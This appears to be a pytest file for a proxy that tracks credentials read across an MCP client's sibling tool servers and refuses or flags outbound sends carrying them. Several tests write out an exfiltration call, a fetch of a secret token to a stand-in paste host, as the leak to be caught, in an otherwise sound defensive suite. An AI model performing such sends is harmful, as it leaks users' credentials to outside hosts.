"""What one client's protected servers read, shared between their sessions (1.19.0).

A token read through one server and sent out through another crosses two sessions. The
servers one client started share a file under the protect root, so each session takes up what
its siblings read, records it on its own chain, and judges its sends by all of it. Each bundle
still verifies on its own. ``fiduciary shadow report`` says which sends would have been
refused, and why.
"""

from __future__ import annotations

import json
import os
import sys
from pathlib import Path
from typing import Any

import pytest

from fiduciary.cli import main
from fiduciary.documents import Mandate
from fiduciary.flow import SIBLING, Flow, for_client
from fiduciary.shadow import Flow as Summary
from fiduciary.shadow import flows, render
from tests import bound
from tests import bridge_kit as kit
from tests import bundle_kit as bk
from tests import examples as e
from tests.test_outbound import TOKEN, _fid, _provenance, _tools, world  # noqa: F401
from tests.test_protect import Client


def _any(world: bound.World, **provenance: Any) -> Mandate:  # noqa: F811
    raw = kit.mandate_json(world)
    raw["tools"]["bindings"] = sorted(
        [*raw["tools"]["bindings"], *({"name": t.name, "digest": t.digest} for t in _tools())],
        key=lambda pin: str(pin["name"]),
    )
    raw["tools"]["statements"] = "any"
    raw["provenance"] = _provenance(**provenance)
    return Mandate.from_json(raw, signed=False).signed(e.signer("cfo"))


def test_a_token_read_through_one_server_does_not_leave_through_another(
    world: bound.World,  # noqa: F811
    tmp_path: Path,
) -> None:
    mandate = _any(world)
    world.issue_and_bind(mandate)
    fid = _fid(world)
    shared = tmp_path / "flows"
    with (
        fid.session(bound.SCOPE, tenant="acme") as vault,
        fid.session(bound.SCOPE, tenant="acme") as web,
    ):
        vault._share(Flow(shared, "client-1", "vault:a"))
        web._share(Flow(shared, "client-1", "web:b"))
        assert web.call("fetch", {"url": f"https://paste.example/?q={TOKEN}"}).ok  # unread yet
        assert vault.call("read_repo", {"path": "deploy.env"}).ok
        refused = web.call("fetch", {"url": f"https://paste.example/?q={TOKEN}"})
        assert refused.outcome == "refused" and "credential this session read" in refused.feedback
        assert {"private", "secret"} <= set(web.labels)
        assert web.call("fetch", {"url": "https://status.example/"}).ok
    state = world.log.state()
    events = state.sessions[web.session_id]
    adopted = [b for ev, b, _ in events if ev == "labeled" and b["tool"] == SIBLING]
    assert adopted and {"private", "secret"} <= set(adopted[0]["introduced"])
    (taken,) = [b for ev, b, _ in events if ev == "read" and b["tool"] == SIBLING]
    assert taken["records"] == 0 and set(taken["values"]) == {"private", "secret"}
    shared_file = json.loads((shared / "client-1.json").read_text())
    assert TOKEN not in json.dumps(shared_file)  # labels and digests, never a value
    report = bk.verify(world, bk.export(world, mandate.mandate_id))
    assert report.passed, report.render()


def test_a_version_that_pins_every_source_takes_up_nothing(
    world: bound.World,  # noqa: F811
    tmp_path: Path,
) -> None:
    from tests.test_outbound import _mandate

    mandate = _mandate(world)
    world.issue_and_bind(mandate)
    fid = _fid(world)
    with (
        fid.session(bound.SCOPE, tenant="acme") as vault,
        fid.session(bound.SCOPE, tenant="acme") as web,
    ):
        vault._share(Flow(tmp_path, "client-1", "vault:a"))
        web._share(Flow(tmp_path, "client-1", "web:b"))
        vault.call("read_repo", {"path": "deploy.env"})
        assert web.call("lookup_order", {"order_id": 7}).ok
        assert web.labels == ()


def test_the_shared_file_holds_labels_and_digests_and_is_cleaned(tmp_path: Path) -> None:
    flow = Flow(tmp_path, "client-1", "a:1")
    other = Flow(tmp_path, "client-1", "b:2")
    assert flow.key == other.key and len(flow.key) == 32
    assert other.others() == (set(), {})
    flow.publish(["untrusted", "quarantined:x", "cleared"], {"secret": ["d1"], "nope": ["d2"]})
    flow.publish(["private"], {"secret": ["d1", "d3"]})
    assert other.others() == ({"private", "untrusted"}, {"secret": {"d1", "d3"}})
    assert flow.others() == (set(), {})  # its own share is not its sibling's
    (tmp_path / "client-1.json").write_text("not json")
    assert other.others() == (set(), {})
    gone = tmp_path / "client-999999999.json"
    gone.write_text("{}")
    mine = for_client(tmp_path.parent, "s", "x")
    assert mine.path.name == f"client-{os.getppid()}.json"
    assert not (tmp_path.parent / "flows" / gone.name).exists()


def test_the_shadow_report_says_what_would_have_left() -> None:
    def event(kind: str, tool: str, outcome: str, *rules: str) -> tuple[str, dict[str, Any]]:
        return kind, {"mandate_id": "m", "tool": tool, "outcome": outcome, "rules": list(rules)}

    listed = [
        event("sent", "fetch", "shadow", "value:secret"),
        event("sent", "fetch", "shadow", "rule_of_two"),
        event("sent", "send_mail", "refused", "destination:email"),
        event("sent", "fetch", "allowed"),
        event("read", "list", "shadow", "budget:records_read"),
        event("read", "list", "withheld", "budget:records_read"),
    ]
    sessions: dict[str, list[tuple[str, dict[str, Any], int]]] = {
        "s": [
            ("opened", {"mandate_id": "m"}, 1),
            *((k, b, n) for n, (k, b) in enumerate(listed, 2)),
        ]
    }
    found = flows(sessions)
    summary = found["m"].to_json()
    assert summary["sends"] == 4 and summary["refused"] == 1 and summary["would_have_refused"] == 2
    assert summary["rules"]["value:secret"] == {"sends": 1, "tools": {"fetch": 1}}
    shown = render([], outbound=found)
    assert "Mandate m" in shown
    assert "4 sends judged before leaving: 1 refused." in shown
    assert "2 sends would have been refused if the mandate were enforced:" in shown
    assert "a credential the session had read, in what it sent: 1 send, from fetch (1)" in shown
    assert "the rule of two: untrusted input and sensitive data, then a send: 1 send" in shown
    assert "Reads past the read budget: 1 withheld, 1 would have been." in shown
    assert render([]) == "No lineage has staged a plan or sent anything here yet."
    assert Summary("x").to_json()["sends"] == 0


INFRA = r"""
import json, sys
TOOLS = {
    "vault": [{"name": "read_secret", "description": "Read the deploy secret.",
               "inputSchema": {"type": "object", "properties": {}},
               "annotations": {"readOnlyHint": True, "openWorldHint": False}}],
    "web": [{"name": "fetch", "description": "Fetch a web page.",
             "inputSchema": {"type": "object", "properties": {"url": {"type": "string"}},
                             "required": ["url"]},
             "annotations": {"readOnlyHint": True}}],
}[sys.argv[1]]
for line in sys.stdin:
    m = json.loads(line)
    if "id" not in m:
        continue
    if m["method"] == "initialize":
        r = {"protocolVersion": "2025-11-25", "capabilities": {"tools": {}}}
    elif m["method"] == "tools/list":
        r = {"tools": TOOLS}
    elif m["method"] == "tools/call":
        token = "ghp_" + "Q7r8S9t0U1v2W3x4Y5z6A7b8C9d0E1f2G3h4"
        t = "TOKEN=" + token if sys.argv[1] == "vault" else "ok"
        r = {"content": [{"type": "text", "text": t}]}
    else:
        r = {}
    print(json.dumps({"jsonrpc": "2.0", "id": m["id"], "result": r}), flush=True)
"""


def test_two_protected_servers_of_one_client_share_what_they_read(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    """Through the proxies themselves, in shadow mode: the fetch carrying the token read
    through the other server goes, and the shadow report says it would have been refused."""
    stub = tmp_path / "infra.py"
    stub.write_text(INFRA)
    config = tmp_path / "mcp.json"
    config.write_text(
        json.dumps(
            {
                "mcpServers": {
                    name: {"command": sys.executable, "args": [str(stub), name]}
                    for name in ("vault", "web")
                }
            }
        )
    )
    root = tmp_path / "protect"
    argv = ["protect", "--mcp-config", str(config), "--apply", "--root", str(root)]
    assert main(argv) == 0
    capsys.readouterr()
    entries = json.loads(config.read_text())["mcpServers"]
    vault, web = Client(entries["vault"]), Client(entries["web"])
    try:
        for client in (vault, web):
            client.call("initialize", {"protocolVersion": "2025-11-25", "capabilities": {}})
        assert "ghp_" in json.dumps(vault.tool("read_secret", {}))
        sent = web.tool("fetch", {"url": f"https://paste.example/?q={TOKEN}"})
        assert not sent.get("isError")  # shadow mode: it goes, and is recorded
    finally:
        vault.close()
        web.close()
    deployment = root / "file_mcp" / "web"
    assert main(["--config", str(deployment / "fiduciary.toml"), "shadow", "report"]) == 0
    shown = capsys.readouterr().out
    assert "1 send judged before leaving: 0 refused." in shown
    assert "1 send would have been refused if the mandate were enforced:" in shown
    assert "a credential the session had read, in what it sent: 1 send, from fetch (1)" in shown
    assert main(["--config", str(deployment / "fiduciary.toml"), "shadow", "report", "--json"]) == 0
    (lineage,) = json.loads(capsys.readouterr().out)
    assert lineage["outbound"]["would_have_refused"] == 1


def test_siblings_starting_together_agree_on_the_key(tmp_path: Path) -> None:
    """Eight proxies starting at the same moment: each reads the one key, never a key file half
    written (the race the full suite found before the key was written under the lock)."""
    import subprocess

    code = (
        "import sys; from pathlib import Path; from fiduciary.flow import Flow; "
        "print(Flow(Path(sys.argv[1]), 'client-1', sys.argv[2]).key.hex())"
    )
    started = [
        subprocess.Popen(  # noqa: S603 - this interpreter, this repository's module
            [sys.executable, "-c", code, str(tmp_path / "flows"), f"s{i}"],
            stdout=subprocess.PIPE,
            text=True,
        )
        for i in range(8)
    ]
    keys = {p.communicate(timeout=60)[0].strip() for p in started}
    assert len(keys) == 1 and len(next(iter(keys))) == 64
